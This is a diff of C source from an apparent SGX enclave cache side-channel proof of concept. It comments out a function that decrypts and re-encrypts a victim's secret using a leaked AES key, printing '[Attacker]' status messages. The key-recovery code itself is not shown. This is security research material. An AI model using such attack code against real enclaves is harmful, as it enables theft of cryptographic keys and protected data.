@@ -14,7 +14,7 @@
 #include "Enclave/victim_enclave_u.h"
 #include "set_sched.h"
 #include "cache.h"
-#include "aes.h"
+// #include "aes.h"
 
 #define DEBUG_ENCLAVE 1
 #define BLOCK_SIZE 16
@@ -57,7 +57,7 @@ static int eliminate(void);
 static void calcBaseKey(void);
 static void calcKey(void);
 static void printKey(void);
-static void decryptSecret(void);
+// static void decryptSecret(void);
 
 /*
  * Global variables exist for alignment reasons.
@@ -318,35 +318,35 @@ static void printKey(void) {
 /*
  * Decrypt secret with leaked key
  */
-static void decryptSecret(void) {
-	/*
-	 * Some weird OpenSSL lowlevel bug is causing buffer-overflows
-	 */
-	char dummy_buf[100];
-	AES_KEY leaked_enc_key;
-	AES_KEY leaked_dec_key;
+// static void decryptSecret(void) {
+// 	/*
+// 	 * Some weird OpenSSL lowlevel bug is causing buffer-overflows
+// 	 */
+// 	char dummy_buf[100];
+// 	AES_KEY leaked_enc_key;
+// 	AES_KEY leaked_dec_key;
 
-	fprintf(stderr, "[Attacker] Original ciphertext: ");
-	for(byte=0; byte<KEYLEN; byte++) {
-		fprintf(stderr, "%02hhx", enc_msg[byte]);
-	}
-	fprintf(stderr, "\n");
+// 	fprintf(stderr, "[Attacker] Original ciphertext: ");
+// 	for(byte=0; byte<KEYLEN; byte++) {
+// 		fprintf(stderr, "%02hhx", enc_msg[byte]);
+// 	}
+// 	fprintf(stderr, "\n");
 
-	fprintf(stderr, "[Attacker] Decrypting message with leaked key\n");
-	AES_set_decrypt_key(secret_key, KEYLEN*8, &leaked_dec_key);
-	AES_decrypt(enc_msg, out, &leaked_dec_key);
-	fprintf(stderr, "[Attacker] Decrypted plaintext: %s\n", out);
+// 	fprintf(stderr, "[Attacker] Decrypting message with leaked key\n");
+// 	AES_set_decrypt_key(secret_key, KEYLEN*8, &leaked_dec_key);
+// 	AES_decrypt(enc_msg, out, &leaked_dec_key);
+// 	fprintf(stderr, "[Attacker] Decrypted plaintext: %s\n", out);
 
 
-	fprintf(stderr, "[Attacker] Encrypting plaintext again with leaked key\n");
-	AES_set_encrypt_key(secret_key, KEYLEN*8, &leaked_enc_key);
-	AES_encrypt(out, enc_msg, &leaked_enc_key);
-	fprintf(stderr, "[Attacker] Encrypted plaintext: ");
-	for(byte=0; byte<KEYLEN; byte++) {
-		fprintf(stderr, "%02hhx", enc_msg[byte]);
-	}
-	fprintf(stderr, "\n");
-}
+// 	fprintf(stderr, "[Attacker] Encrypting plaintext again with leaked key\n");
+// 	AES_set_encrypt_key(secret_key, KEYLEN*8, &leaked_enc_key);
+// 	AES_encrypt(out, enc_msg, &leaked_enc_key);
+// 	fprintf(stderr, "[Attacker] Encrypted plaintext: ");
+// 	for(byte=0; byte<KEYLEN; byte++) {
+// 		fprintf(stderr, "%02hhx", enc_msg[byte]);
+// 	}
+// 	fprintf(stderr, "\n");
+// }
 
 
 
@@ -449,7 +449,7 @@ int main(int argc,char **argv) {
 			fprintf(stderr, "[Attacker] The initial encryption key was: ");
 			printKey();
 			// decrypt secret
-			decryptSecret();
+			// decryptSecret();
 			break;
 		}
 
